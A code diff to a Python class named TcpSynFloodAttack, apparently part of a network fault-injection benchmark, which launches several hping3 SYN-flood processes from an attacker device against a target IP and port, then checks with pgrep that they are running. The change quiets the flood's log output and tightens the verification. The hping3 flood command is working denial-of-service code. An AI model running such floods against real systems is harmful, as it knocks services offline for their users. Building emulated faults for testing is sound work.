@@ -40,19 +40,29 @@ class TcpSynFloodAttack(ProblemBase):
             f"for source_port in $(seq {base_port} {base_port + params.flows - 1}); do "
             f"timeout {params.duration}s hping3 -S -s $source_port "
             f"-p {params.target_port} -i u{per_flow_interval_us} "
-            f"{params.target_ip} >>/tmp/nika-syn-flood.log 2>&1 & done"
+            f"{params.target_ip} >/dev/null 2>&1 & done"
         )
         self.runtime.exec(params.attacker_device, command, timeout=10)
         self._profile = {**params.model_dump(), "interval_us": interval_us}
 
     def verify_fault(self, params: TcpSynFloodAttackParams) -> dict:
+        """Verify SYN generators toward the target are running on the attacker."""
+        # Bracket the first character so pgrep does not match its own shell.
+        pattern = f"[h]ping3 -S .*-p {params.target_port} .*{params.target_ip}"
         output = self.runtime.exec(
             params.attacker_device,
-            "pgrep -f 'hping3.*--flood' || test -s /tmp/nika-syn-flood.log; echo $?",
+            f"pgrep -fc '{pattern}' 2>/dev/null || true",
             timeout=10,
-        )
+        ).strip()
+        try:
+            flows_running = int(output.splitlines()[-1])
+        except (IndexError, ValueError):
+            flows_running = 0
         return build_verify_result(
             fault_type=self.root_cause_name,
-            verified=output.strip().endswith("0") or bool(output.strip()),
-            details={"traffic_profile": getattr(self, "_profile", params.model_dump())},
+            verified=flows_running >= 1,
+            details={
+                "flows_running": flows_running,
+                "traffic_profile": getattr(self, "_profile", params.model_dump()),
+            },
         )
